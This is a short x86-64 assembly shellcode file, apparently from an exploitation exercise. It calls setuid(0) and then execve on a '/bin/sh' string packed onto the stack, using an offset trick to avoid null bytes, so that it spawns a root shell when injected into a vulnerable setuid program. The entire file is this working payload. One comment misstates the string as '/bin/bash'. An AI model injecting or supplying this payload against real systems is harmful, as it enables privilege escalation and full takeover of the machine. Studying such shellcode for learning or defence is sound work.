.global _start 
_start:
.intel_syntax noprefix
######   setuid(0)
        xor rax, rax # 0 out rax
        add rax, 105 # add opcode of setuid to rax
        xor rdi, rdi # 0 out rdi to make 0 the imput of setuid
        syscall

        xor rax, rax
        add rax, 59
        xor rdi, rdi
        xor rbx, rbx
        push rbx # set to 0 the top of the stack
        mov rbx, 0x68732f6e69622fff
        push rbx # stack out the /bin/bash string

#
#              RANDOM
#   -----------------------------
#         0x0000000000000000
#   -----------------------------
#         0x68732f6e69622fff
#   -----------------------------


        lea rdi, [rsp+1] # Make RDI point to the beggining of the /bin/bash string, which is null-terminated at the next stack slot

        xor rsi, rsi
        xor rdx, rdx
        syscall
